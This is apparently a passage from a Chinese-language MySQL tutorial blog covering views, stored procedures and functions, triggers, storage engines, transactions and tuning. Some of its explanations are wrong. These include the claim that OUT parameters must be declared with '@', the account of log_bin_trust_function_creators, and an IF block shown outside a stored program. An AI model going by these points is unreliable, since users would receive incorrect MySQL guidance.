<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE VIEW v1 AS<br>SELECT empid, sales<br>FROM tb<br>WHERE sales &gt;= 100;<br></code></pre></td></tr></table></figure>

<p>INSERT数据时不在这个范围内：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO v1 VALUES(&#x27;new_empid&#x27;, 15);<br></code></pre></td></tr></table></figure>

<p>执行之后，虽然视图v1中没有(‘new_empid’, 15)这条数据，但是基本表中已经INSERT成功，存在了这条数据。</p>
<p>为避免这种情况发生，可以将视图设置为”不接受与条件不匹配的记录“，在CREATE VIEW时，添加WITH CHECK OPTION：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE VIEW v1 AS<br>SELECT empid, sales<br>FROM tb<br>WHERE sales &gt;= 100<br>WITH CHECK OPTION;<br></code></pre></td></tr></table></figure>

<p>这样就无法插入不符合条件的记录了。</p>
<h2 id="显示视图"><a href="#显示视图" class="headerlink" title="显示视图"></a>显示视图</h2><p>表和视图在显示上的操作是相同的，也是通过SHOW TABLES命令操作，视图会与表一起显示出来。</p>
<p>要查看视图的列结构也是和表一样的操作</p>
<p>显示视图view_name的列结构示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DESC view_name;<br></code></pre></td></tr></table></figure>

<p>显示创建语句视图的SQL语句示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW CREATE VIEW view_name<br></code></pre></td></tr></table></figure>

<h2 id="替换视图"><a href="#替换视图" class="headerlink" title="替换视图"></a>替换视图</h2><p>这里的替换视图的含义是删除已经存在的同名视图并创建新视图，操作方法是加上OR REPLACE：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE OR REPLACE VIEW v1 AS<br>SELECT NOW();<br></code></pre></td></tr></table></figure>

<h2 id="修改视图结构"><a href="#修改视图结构" class="headerlink" title="修改视图结构"></a>修改视图结构</h2><p>修改视图结构使用的也是ALTER命令，命令格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER VIEW view_name AS (SELECT语句);<br></code></pre></td></tr></table></figure>

<h2 id="删除视图"><a href="#删除视图" class="headerlink" title="删除视图"></a>删除视图</h2><p>如果存在就删除视图：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DROP VIEW IF EXISTS v1;<br></code></pre></td></tr></table></figure>

<p>IF EXISTS的作用参见删除数据库。</p>
<h1 id="存储过程"><a href="#存储过程" class="headerlink" title="存储过程"></a>存储过程</h1><blockquote>
<p>MySQL存储过程（Stored Procedure）是一组预编译的SQL语句集合，可以在数据库中重复运行使用</p>
<p>将多个SQL语句组合成一个只需要使用命令”CALL * *“就能执行的集合，该集合就称为存储过程（stored process）</p>
</blockquote>
<h2 id="创建存储过程"><a href="#创建存储过程" class="headerlink" title="创建存储过程"></a>创建存储过程</h2><p>存储过程由以下部分组成：</p>
<ol>
<li><p>存储过程名称：唯一标识存储过程的名称。</p>
</li>
<li><p>参数列表：定义存储过程需要的输入或输出参数。</p>
</li>
<li><p>SQL语句：实际执行的SQL语句集合。</p>
</li>
<li><p>控制流程：定义存储过程如何处理条件、循环和异常等情况。</p>
</li>
</ol>
<p>以下是创建和使用MySQL存储过程的基本步骤：</p>
<ol>
<li>使用CREATE PROCEDURE语句创建存储过程：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE PROCEDURE procedure_name (IN input_parameter1 data_type1, IN input_parameter2 data_type2, OUT output_parameter data_type)<br>BEGIN<br>  -- SQL statements here<br>END;<br></code></pre></td></tr></table></figure>

<p>其中，procedure_name为存储过程名称，input_parameter和output_parameter是存储过程的输入和输出参数，data_type指定了参数的数据类型。在BEGIN和END之间是定义的存储过程的SQL语句。</p>
<p>在MySQL中，创建存储过程需要使用DELIMITER语句指定分隔符。默认情况下，MySQL使用分号（;）作为SQL语句和命令的分隔符。如果没有修改分隔符，MySQL会第一个分号视为存储过程定义语句的结束符，会导致错误。</p>
<p>可以使用DELIMITER语句定义新的分隔符，例如“$$”，然后在存储过程结束时再将分隔符重置为默认值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DELIMITER $$<br>CREATE PROCEDURE my_procedure()<br>BEGIN<br>  -- SQL statements here<br>END $$<br>DELIMITER ;<br></code></pre></td></tr></table></figure>

<p>注意，在上面的示例中，我们将分隔符从默认的分号设置为两个美元符号“$$”。当存储过程定义完毕后，我们需要将分隔符重置成分号以便后续操作。</p>
<h2 id="调用存储过程"><a href="#调用存储过程" class="headerlink" title="调用存储过程"></a>调用存储过程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CALL procedure_name(input_value1, input_value2, @output_value);<br></code></pre></td></tr></table></figure>

<p>其中，input_value1和input_value2是存储过程的传入参数值，@output_value是存储过程的输出参数。您可以用SELECT语句检索@output_value的值。</p>
<p>需要注意的是，MySQL存储过程支持条件、循环和异常处理等复杂的控制流程结构。存储过程可以将这些结构与SQL语句组合在一起，以完成特定的任务或操作。</p>
<p> 存储过程的输出参数有个@的原因： </p>
<p>在MySQL中，存储过程参数分为输入参数和输出参数。与输入参数不同，输出参数必须使用@前缀来声明。</p>
<p>这是因为MySQL中的@符号表示用户定义变量（User-Defined Variables），可以在多个SQL语句之间传递值。当在存储过程中声明一个输出参数时，实际上是在创建一个用户定义变量，以便将结果从存储过程传递出去。</p>
<p>例如，下面是一个简单的存储过程示例，它将两个整数相加，并将结果存储在输出参数中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE PROCEDURE add_numbers(IN num1 INT, IN num2 INT, OUT result INT)<br>BEGIN<br>  SET result = num1 + num2;<br>END;<br></code></pre></td></tr></table></figure>

<p>在执行该存储过程时，需要声明一个用户定义变量，并在调用存储过程时将其传递给输出参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SET @output_value = 0;<br>CALL add_numbers(10, 20, @output_value);<br>SELECT @output_value;<br></code></pre></td></tr></table></figure>

<p>在上面的代码中，我们首先使用SET语句创建了一个名为@output_value的用户定义变量，并将其初始化为0。然后，我们调用了add_numbers存储过程，并将10和20作为输入参数传递给它。最后，我们使用SELECT语句检索输出参数的值。注意，我们使用了@前缀来引用输出参数。</p>
<p>需要注意的是，在MySQL中，用户定义变量的作用域仅限于当前会话（Session）。这意味着在存储过程内部定义的用户定义变量不能在存储过程外部使用，反之亦然。</p>
<h2 id="显示存储过程"><a href="#显示存储过程" class="headerlink" title="显示存储过程"></a>显示存储过程</h2><p>要在MySQL中查看存储过程的定义，可以使用SHOW CREATE PROCEDURE语句。该语句将显示与存储过程相关的详细信息，包括存储过程名称、参数列表和SQL语句。</p>
<p>以下是一个示例存储过程，它返回员工的姓名和薪水：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE PROCEDURE get_employee(IN employee_id INT, OUT employee_name VARCHAR(50), OUT employee_salary DECIMAL(10,2))<br>BEGIN<br>  SELECT name, salary INTO employee_name, employee_salary FROM employees WHERE id = employee_id;<br>END;<br></code></pre></td></tr></table></figure>

<p>要查看该存储过程的定义，请执行以下语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW CREATE PROCEDURE get_employee;<br></code></pre></td></tr></table></figure>

<p>执行结果类似于下面的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">Procedure: get_employee<br>Create Procedure: CREATE PROCEDURE `get_employee`(IN employee_id INT, OUT employee_name VARCHAR(50), OUT employee_salary DECIMAL(10,2))<br>BEGIN<br>  SELECT name, salary INTO employee_name, employee_salary FROM employees WHERE id = employee_id;<br>END<br></code></pre></td></tr></table></figure>

<p>其中，第一行显示了存储过程的名称（Procedure: get_employee），而第二行则显示了完整的CREATE PROCEDURE语句，包括存储过程的定义。</p>
<p>需要注意的是，如果您没有对存储过程具有足够的权限，SHOW CREATE PROCEDURE语句可能会返回“Access denied”错误。在这种情况下，您需要确保已经授予了足够的权限，并且使用正确的MySQL用户来执行该语句。</p>
<h2 id="删除存储过程"><a href="#删除存储过程" class="headerlink" title="删除存储过程"></a>删除存储过程</h2><p>在MySQL中删除存储过程非常简单。您可以使用DROP PROCEDURE语句来删除一个或多个存储过程。</p>
<p>以下是删除名为get_employee的存储过程的示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DROP PROCEDURE IF EXISTS get_employee;<br></code></pre></td></tr></table></figure>

<p>在这个示例中，我们使用了DROP PROCEDURE语句来删除名称为get_employee的存储过程。如果该存储过程不存在，它将不会产生任何影响。如果存在同名的存储过程，则该命令将永久删除该存储过程，而无法撤消操作。</p>
<p>IF EXISTS的作用参见前面章节的删除数据库。</p>
<h1 id="存储函数"><a href="#存储函数" class="headerlink" title="存储函数"></a>存储函数</h1><blockquote>
<p>存储函数（stored function）的操作方法和存储过程基本相同，与存储过程的唯一不同是，存储函数在执行后只会返回一个值，主要用于返回单个值而不是执行操作。</p>
<p>存储函数可以接受零个或多个输入参数，并返回一个标量值（例如整数、字符串、日期等）</p>
<p>如果需要在SQL查询中计算一些复杂的表达式或逻辑，则可以使用存储函数来简化查询语句</p>
<p>MySQL有许多函数，但使用存储函数可以创建自定义的函数，所以存储函数也称为用户定义函数</p>
</blockquote>
<h2 id="启用存储函数日志"><a href="#启用存储函数日志" class="headerlink" title="启用存储函数日志"></a>启用存储函数日志</h2><p>当log_bin_trust_function_creators为0时，用户不能创建或更新存储函数。</p>
<p>在MySQL中，log_bin_trust_function_creators是一个系统变量，它用于控制是否记录创建存储函数（CREATE FUNCTION语句）的操作到二进制日志中。这个变量的默认值为0（关闭，OFF），这意味着MySQL不会将CREATE FUNCTION语句记录到二进制日志中。把log_bin_trust_function_creators设置为1，将允许用户创建和修改存储函数，并且这些操作也将被记录到二进制日志中。</p>
<p>需要注意的是，即使log_bin_trust_function_creators被设置为1，用户也需要适当的权限才能够创建、修改或删除存储函数。这包括CREATE ROUTINE、ALTER ROUTINE和DROP ROUTINE等权限。如果用户没有这些权限，则无法执行相关操作。</p>
<p>要启用log_bin_trust_function_creators，可以采用以下方法：</p>
<ol>
<li><p>使用SET</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SET GLOBAL log_bin_trust_function_creators = 1;<br></code></pre></td></tr></table></figure>


</li>
<li><p>修改my.cnf</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[mysqld]</span><br><span class="hljs-attr">log_bin_trust_function_creators</span> = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li>
</ol>
<p>要查看log_bin_trust_function_creators，可以采用以下方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW VARIABLES LIKE &#x27;log_bin_trust_function_creators&#x27;;<br></code></pre></td></tr></table></figure>

<h2 id="创建存储函数"><a href="#创建存储函数" class="headerlink" title="创建存储函数"></a>创建存储函数</h2><p>以下是一个计算两个整数之和的示例存储函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE FUNCTION add_numbers(num1 INT, num2 INT) RETURNS INT<br>BEGIN<br>  DECLARE result INT; -- 语法是 DECLARE 变量名 数据类型<br>  SET result = num1 + num2; <br>  -- 或者使用SELECT INTO，示例：SELECT AVG(sales) INTO result FROM tb;<br>  RETURN result;<br>END;<br></code></pre></td></tr></table></figure>

<p>在这个示例中，我们定义了一个名为add_numbers的存储函数，它接受两个整数作为输入参数，并返回它们的和。在存储函数内部，我们使用DECLARE语句声明了一个名为result的局部变量，并将num1和num2的和赋值给它。最后，我们使用RETURN语句返回result的值。</p>
<p>要调用该存储函数，请使用SELECT语句进行查询：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT add_numbers(10, 20);<br></code></pre></td></tr></table></figure>

<p>在此查询中，我们调用了add_numbers函数，并传递了10和20作为两个输入参数。该函数将返回它们的和，即30。</p>
<p>需要注意的是，在MySQL中，存储函数应该具有确定性，也就是说，对于相同的输入参数，它应该始终返回相同的结果。此外，存储函数还应该具有不产生副作用的性质，也就是说，它不应该修改数据库中的数据或执行任何有意义的操作。如果存储函数违反了这些规则，可能会导致不可预测的结果或安全问题。</p>
<h2 id="显示存储函数"><a href="#显示存储函数" class="headerlink" title="显示存储函数"></a>显示存储函数</h2><h3 id="显示数据库中所有的存储函数"><a href="#显示数据库中所有的存储函数" class="headerlink" title="显示数据库中所有的存储函数"></a>显示数据库中所有的存储函数</h3><p>你可以使用MySQL的SHOW FUNCTION STATUS语句来显示所有定义在数据库中的存储函数。</p>
<p>具体来说，该语句的语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW FUNCTION STATUS;<br></code></pre></td></tr></table></figure>
<p>执行该语句将返回包含以下列的结果集：</p>
<ol>
<li>Db：与存储函数相关联的数据库名称。</li>
<li>Name：存储函数的名称。</li>
<li>Type：函数类型（标量函数 [SCALAR FUNCTION]、聚合函数 [AGGREGATE FUNCTION]、窗口函数 [WINDOW FUNCTION]）。</li>
<li>Definer：函数创建者。</li>
<li>Modified：最近一次修改时间。</li>
<li>Created：创建时间。</li>
<li>Security_type：安全模式。</li>
</ol>
<p>此外，还有其他可选的列，例如Comment和character_set_client。</p>
<p>如果你想查看特定表的存储函数，你需要在SHOW FUNCTION STATUS语句后面添加LIKE子句来指定要查询的模式，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW FUNCTION STATUS LIKE &#x27;myfunction%&#x27;;<br></code></pre></td></tr></table></figure>

<p>上面的示例将返回名称以“myfunction”开头的所有存储函数。</p>
<h3 id="显示指定存储函数"><a href="#显示指定存储函数" class="headerlink" title="显示指定存储函数"></a>显示指定存储函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW CREATE FUNCTION function_name;<br></code></pre></td></tr></table></figure>

<h2 id="删除存储函数"><a href="#删除存储函数" class="headerlink" title="删除存储函数"></a>删除存储函数</h2><p>删除存储函数的语法格式是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DROP FUNCTION 存储函数名;<br></code></pre></td></tr></table></figure>

<h1 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h1><blockquote>
<p>MySQL触发器（trigger）是一种数据库对象，它允许你在特定的表上定义自动执行的操作，当满足触发器定义的条件时，该操作将自动触发。</p>
<p>常见的使用场景包括：</p>
<ul>
<li>在记录插入&#x2F;更新&#x2F;删除操作时自动生成日志记录。</li>
<li>在记录插入&#x2F;更新&#x2F;删除操作时同步到其他相关的表。</li>
<li>在记录插入&#x2F;更新时进行验证或格式化等操作。</li>
</ul>
<p>需要注意的是，MySQL触发器在处理大量数据时可能会显著减慢数据库性能，因此应谨慎使用。</p>
</blockquote>
<h2 id="创建触发器"><a href="#创建触发器" class="headerlink" title="创建触发器"></a>创建触发器</h2><p>一个MySQL触发器包含以下几个部分：</p>
<ol>
<li>触发器名称：用于标识触发器的名称。</li>
<li>关联表名称：需要关联到触发器的表名。</li>
<li>事件类型：可以是INSERT、UPDATE或DELETE，表示在关联表中执行的操作类型。</li>
<li>触发时间：可以是BEFORE或AFTER，指定何时执行触发操作。</li>
<li>条件：指定触发操作的条件，可以使SQL语句中的WHERE子句。</li>
<li>触发操作：在满足触发器条件时要执行的操作，可以是一条或多条SQL语句。</li>
</ol>
<p>下面是一个创建MySQL触发器的示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TRIGGER my_trigger<br>AFTER INSERT ON my_table<br>FOR EACH ROW<br>BEGIN<br>    -- 触发操作<br>END;<br></code></pre></td></tr></table></figure>

<p>在上述示例中，创建了一个名为my_trigger的触发器，设置为在my_table表中进行插入操作之后自动调用。FOR EACH ROW关键字表示该操作针对每个插入的行都会执行一次。在BEGIN和END之间的代码块则是要执行的SQL语句操作。</p>
<h2 id="OLD、NEW关键字"><a href="#OLD、NEW关键字" class="headerlink" title="OLD、NEW关键字"></a>OLD、NEW关键字</h2><p>在MySQL触发器中，可以使用<code>OLD</code>和<code>NEW</code>关键字来获取一个操作（如 INSERT、UPDATE 或 DELETE）的旧值和新值。</p>
<ul>
<li><p>OLD.列名</p>
<p>OLD.列名是对表处理前的列值</p>
<p>INSERT事件类型没有OLD.列名</p>
</li>
<li><p>NEW.列名</p>
<p>NEW.列名是对表处理后的列值</p>
<p>DELETE事件类型没有NEW.列名</p>
</li>
</ul>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TRIGGER delete_trigger<br>BEFORE DELETE ON employee<br>FOR EACH ROW<br>BEGIN<br>    INSERT INTO log_table (id_log_table, emp_id_log_table) VALUES (OLD.id, OLD.emp_id);<br>END;<br></code></pre></td></tr></table></figure>

<p>在上述示例中，<code>OLD</code>关键字被用于访问将要被删除信息的行（旧行）。在此案例中，每次将要删除一行之前，都会将此行的ID和列1插入一个名为log_table的表中。</p>
<h2 id="显示触发器"><a href="#显示触发器" class="headerlink" title="显示触发器"></a>显示触发器</h2><p>如果你想要显示MySQL数据库中的触发器，可以使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW TRIGGERS;<br></code></pre></td></tr></table></figure>

<p>当你执行上述命令时，将返回包含所有已创建触发器的结果集。该结果集包括每个触发器的名称、关联表、事件类型、触发时间和触发语句。</p>
<p>如果你只想检索指定表的触发器，则可以使用以下语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW TRIGGERS FROM your_database_name LIKE &#x27;your_table_name&#x27;;<br></code></pre></td></tr></table></figure>

<p>需要将“your_database_name”替换为你要查询的数据库名称，“your_table_name”替换为你要查询的表名称。这条命令将返回满足特定条件的结果集。</p>
<h2 id="删除触发器"><a href="#删除触发器" class="headerlink" title="删除触发器"></a>删除触发器</h2><p>要删除一个已经存在的MySQL触发器，可以使用以下语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DROP TRIGGER [IF EXISTS] trigger_name;<br></code></pre></td></tr></table></figure>

<p>需要将“trigger_name”替换为你要删除的触发器的名称。可选的参数IF EXISTS表示如果该触发器不存在，也不会抛出错误并且继续执行下一个命令。</p>
<h1 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h1><p>在MySQL中，存储引擎是一种用来处理数据的组件，它决定了如何存储、读取和更新数据。MySQL支持多种不同的存储引擎。</p>
<p>常见的MySQL存储引擎包括：</p>
<ol>
<li><p>InnoDB引擎：InnoDB是MySQL默认的存储引擎，支持事务和行级锁，它可以提供更好的并发性能和可靠性，适合于处理大量更新操作的数据表。 </p>
</li>
<li><p>MyISAM引擎：MyISAM是MySQL早期的一种存储引擎，不支持事务，不支持外键，但支持全文索引和压缩等功能，适合于查询频繁、更新不频繁的数据表。</p>
</li>
<li><p>Memory引擎：Memory存储引擎将表数据存储在内存中，支持非常快速的读写操作，但数据会在MySQL重新启动或重启后丢失，适合于缓存和临时表等应用。</p>
</li>
<li><p>Archive引擎：Archive存储引擎只支持查询和插入操作，不支持更新和删除操作，可以对历史数据进行归档和压缩，节省磁盘空间。</p>
</li>
</ol>
<p>除了上述存储引擎之外，还有其他一些存储引擎，如CSV、Blackhole、Federated等，在实际应用中根据业务需求选择不同的存储引擎进行优化。需要注意的是，不同的存储引擎在性能和功能方面有很大差异，开发人员应该根据具体情况进行选择和调整。</p>
<h2 id="显示存储引擎"><a href="#显示存储引擎" class="headerlink" title="显示存储引擎"></a>显示存储引擎</h2><p>可以通过显示表的创建信息命令来查看使用的存储引擎</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW CREATE TABLE employee; <br></code></pre></td></tr></table></figure>

<p>输出结果示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE `employee` (<br>  `id` int NOT NULL,<br>  `emp_id` char(10) DEFAULT NULL,<br>  `emp_name` varchar(10) DEFAULT NULL,<br>  `manager_id` char(10) DEFAULT NULL,<br>  PRIMARY KEY (`id`)<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci<br></code></pre></td></tr></table></figure>

<h2 id="修改存储引擎"><a href="#修改存储引擎" class="headerlink" title="修改存储引擎"></a>修改存储引擎</h2><p>如果需要修改已有表的存储引擎，可以使用<code>ALTER TABLE</code>语句来实现，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE table_name ENGINE=MyISAM;<br></code></pre></td></tr></table></figure>

<p>使用上述语句将会将名为<code>table_name</code>的表的存储引擎修改为<code>MyISAM</code>。</p>
<h1 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h1><blockquote>
<p>将多个操作作为单个逻辑工作单元处理的功能称为事务（transaction）</p>
<p>将事务开始的处理结果反映到数据库的操作称为提交（commit）</p>
<p>不反映到数据库中而是保持恢复为原来状态的操作称为回滚（rollback）</p>
</blockquote>
<h2 id="开启事务"><a href="#开启事务" class="headerlink" title="开启事务"></a>开启事务</h2><p>如果多个操作需要一起进行，可以将其放在一个事务中，以保证所有操作都要么全部成功，要么全部失败。</p>
<p>在MySQL中，使用以下语句来开始一个事务：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">START TRANSACTION;<br>-- 或者 BEGIN;<br>-- 或者 BEGIN WORK;<br></code></pre></td></tr></table></figure>

<p><code>BEGIN</code>和<code>BEGIN WORK</code>命令也可以用于开启一个新的事务。它们与<code>START TRANSACTION</code>命令作用相同，都可以开启一个新的事务，让后续的SQL语句在这个事务内执行。</p>
<h2 id="提交事务"><a href="#提交事务" class="headerlink" title="提交事务"></a>提交事务</h2><p>如果所有的操作都成功了，则使用以下语句来提交事务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">COMMIT;<br></code></pre></td></tr></table></figure>

<p>在MySQL中，有一个自动提交（autocommit）功能，默认情况下开启。当执行单个SQL语句时，会自动将该语句的修改内容提交到数据库，即将其作为一个事务进行处理。</p>
<p>如果需要关闭自动提交功能，则可以使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SET autocommit = 0;<br></code></pre></td></tr></table></figure>

<p>这样，在执行多个SQL语句时，就需要手动调用BEGIN或START TRANSACTION命令开始一个新的事务，再通过COMMIT或ROLLBACK命令结束事务。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SET autocommit = 0;<br><br>-- 开始一个新的事务<br>BEGIN;<br><br>-- 执行一些SQL语句<br>INSERT INTO table1 (column1, column2) VALUES (value1, value2);<br><br>-- 判断是否发生错误<br>IF some_error_occured THEN<br>    -- 回滚事务<br>    ROLLBACK;<br>ELSE<br>    -- 提交事务<br>    COMMIT;<br>END IF;<br></code></pre></td></tr></table></figure>

<p>以上代码首先关闭了自动提交功能，然后使用BEGIN命令开始了一个新的事务，在其中执行了一些SQL语句，并根据情况选择了提交或回滚事务。</p>
<h2 id="回滚事务"><a href="#回滚事务" class="headerlink" title="回滚事务"></a>回滚事务</h2><p>需要注意的是，在MySQL中，<code>BEGIN</code>、<code>BEGIN WORK</code>和<code>START TRANSACTION</code>命令也可以配合使用，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mysql">BEGIN WORK;<br>-- 或者 BEGIN;<br>-- 或者 START TRANSACTION;<br><br>-- 执行一些SQL操作<br><br>SAVEPOINT sp1;<br><br>-- 执行一些SQL操作<br><br>ROLLBACK TO SAVEPOINT sp1;<br><br>-- 执行一些SQL操作<br><br>COMMIT;<br></code></pre></td></tr></table></figure>

<p>以上示例中，除了开启环节的不同之外，还涉及到了MySQL事务中的保存点（SAVEPOINT）概念。保存点是指在事务内定义的一个标记，用于标识事务内某个时刻的状态。当事务遇到错误并进行回滚时，可以将事务恢复到保存点所标识的状态。</p>
<h1 id="调优"><a href="#调优" class="headerlink" title="调优"></a>调优</h1><p>调优可以提高数据库的性能和吞吐量。以下是一些MySQL调优的方法：</p>
<ol>
<li>优化查询语句</li>
</ol>
<ul>
<li>使用合适的索引：对于经常用于检索的列，创建索引可大幅提升查询效率；</li>
<li>避免使用SELECT *：只选取必要的列可以减少数据传输和磁盘I&#x2F;O；</li>
<li>使用EXPLAIN命令查看查询执行计划：通过观察查询计划，可以了解到查询过程中哪些步骤需要优化。</li>
</ul>
<ol start="2">
<li>调整服务器参数</li>
</ol>
<ul>
<li>修改MySQL缓冲区大小：将innodb_buffer_pool_size设置为合理的大小，以便在缓存中保留更多的数据；</li>
<li>调整处理器缓存和线程池：根据服务器的硬件规格和应用程序类型，适当增加线程池大小和处理器缓存大小，以提高并发处理能力；</li>
<li>修改文件系统缓存大小：根据服务器的硬件和操作系统，可以修改磁盘缓存大小；</li>
</ul>
<ol start="3">
<li>优化表结构设计</li>
</ol>
<ul>
<li>使用恰当的数据类型：为每个列选择最小、最合适的数据类型可以减少磁盘空间和内存开销，提高查询速度；</li>
<li>避免使用太多的JOIN：JOIN操作需要较多的CPU和内存资源，应尽可能减少其使用；</li>
<li>分解大的表：当一个表中包含大量数据时，可以考虑将其分解为多个较小的表，以提高查询和更新效率。</li>
</ul>
<ol start="4">
<li>监控数据库性能</li>
</ol>
<ul>
